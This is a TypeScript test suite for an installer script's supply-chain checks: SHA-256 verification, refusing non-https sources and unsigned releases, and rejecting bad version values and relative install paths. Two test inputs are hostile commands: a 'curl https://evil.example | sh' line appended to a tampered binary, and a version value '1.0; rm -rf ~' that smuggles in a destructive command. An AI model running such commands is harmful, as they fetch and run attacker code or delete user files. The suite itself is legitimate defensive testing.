/**
 * ARI-42 GW-2 (supply chain): scripts/install.sh installs only a binary whose SHA-256 matches the
 * release's SHA256SUMS, refuses plain-http sources and unsigned releases when a signature is
 * required, and leaves nothing behind when it refuses.
 *
 * Runs the real script with `sh` against a local release folder (file://).
 */
import { beforeEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, readdirSync, statSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tempRoot } from "../helpers.ts";

const SCRIPT = join(import.meta.dir, "../../scripts/install.sh");
const asset = `sapi-${process.platform === "darwin" ? "darwin" : "linux"}-${process.arch === "arm64" ? "arm64" : "x64"}`;
const BINARY = "#!/bin/sh\necho 0.0.0-test\n";

let root: string;
let release: string;
let bin: string;

const sha = (s: string) => createHash("sha256").update(s).digest("hex");

function writeRelease(binary = BINARY, sums = `${sha(BINARY)}  ${asset}\n`): void {
  writeFileSync(join(release, asset), binary);
  writeFileSync(join(release, "SHA256SUMS"), sums);
}

function install(env: Record<string, string> = {}) {
  const r = Bun.spawnSync(["sh", SCRIPT], {
    env: {
      PATH: "/usr/bin:/bin:/usr/sbin:/sbin",
      HOME: join(root, "home"),
      SAPI_DOWNLOAD_BASE: `file://${release}`,
      SAPI_INSTALL_DIR: bin,
      ...env,
    },
    stdout: "pipe",
    stderr: "pipe",
  });
  return { code: r.exitCode, err: r.stderr.toString() };
}

beforeEach(() => {
  root = tempRoot();
  release = join(root, "release");
  bin = join(root, "home", ".local", "bin");
  mkdirSync(release);
  mkdirSync(join(root, "home"));
});

describe("install.sh (GW-2)", () => {
  test("installs a binary whose checksum matches, executable, and runs it", () => {
    writeRelease();
    const r = install();
    expect(r.err).toContain(`checksum verified (${asset})`);
    expect(r.code).toBe(0);
    expect(r.err).toContain("installed sapi 0.0.0-test");
    expect(statSync(join(bin, "sapi")).mode & 0o777).toBe(0o755);
    expect(readdirSync(bin)).toEqual(["sapi"]); // no temporary files left behind
  });

  test("a tampered binary is refused and nothing is installed", () => {
    writeRelease(`${BINARY}curl https://evil.example | sh\n`);
    const r = install();
    expect(r.code).not.toBe(0);
    expect(r.err).toContain("checksum mismatch");
    expect(r.err).toContain("Nothing was installed");
    expect(existsSync(join(bin, "sapi"))).toBe(false);
  });

  test("a tampered binary never replaces one that is already installed", () => {
    writeRelease();
    expect(install().code).toBe(0);
    const before = statSync(join(bin, "sapi")).mtimeMs;
    writeRelease(`${BINARY}# changed\n`);
    expect(install().code).not.toBe(0);
    expect(statSync(join(bin, "sapi")).mtimeMs).toBe(before);
  });

  test.each([
    ["no entry for this platform", `${sha(BINARY)}  sapi-plan9-mips\n`],
    ["a short hash", `${sha(BINARY).slice(0, 40)}  ${asset}\n`],
    ["a non-hex hash", `${"Z".repeat(64)}  ${asset}\n`],
    ["an empty SHA256SUMS", ""],
  ])("SHA256SUMS with %s is refused", (_name, sums) => {
    writeRelease(BINARY, sums);
    const r = install();
    expect(r.code).not.toBe(0);
    expect(existsSync(join(bin, "sapi"))).toBe(false);
  });

  test("plain http and other schemes are refused before any download", () => {
    writeRelease();
    for (const base of ["http://127.0.0.1:9/sapi", "ftp://example.com/sapi", "example.com/sapi"]) {
      const r = install({ SAPI_DOWNLOAD_BASE: base });
      expect(r.code).not.toBe(0);
      expect(r.err).toContain("must start with https://");
    }
  });

  test("with no release source configured it stops instead of guessing a URL", () => {
    const r = install({ SAPI_DOWNLOAD_BASE: "" });
    expect(r.code).not.toBe(0);
    expect(r.err).toContain("no release source");
  });

  test("SAPI_REQUIRE_SIGNATURE=1 refuses a release without a verified signature", () => {
    writeRelease();
    const r = install({ SAPI_REQUIRE_SIGNATURE: "1" });
    expect(r.code).not.toBe(0);
    expect(r.err).toContain("signature wasn't verified");
    expect(existsSync(join(bin, "sapi"))).toBe(false);
  });

  test("odd SAPI_VERSION values are refused", () => {
    const r = install({ SAPI_VERSION: "1.0; rm -rf ~" });
    expect(r.code).not.toBe(0);
    expect(r.err).toContain("SAPI_VERSION looks wrong");
  });

  test("a relative install folder is refused", () => {
    writeRelease();
    const r = install({ SAPI_INSTALL_DIR: "bin" });
    expect(r.code).not.toBe(0);
    expect(r.err).toContain("absolute path");
  });
});
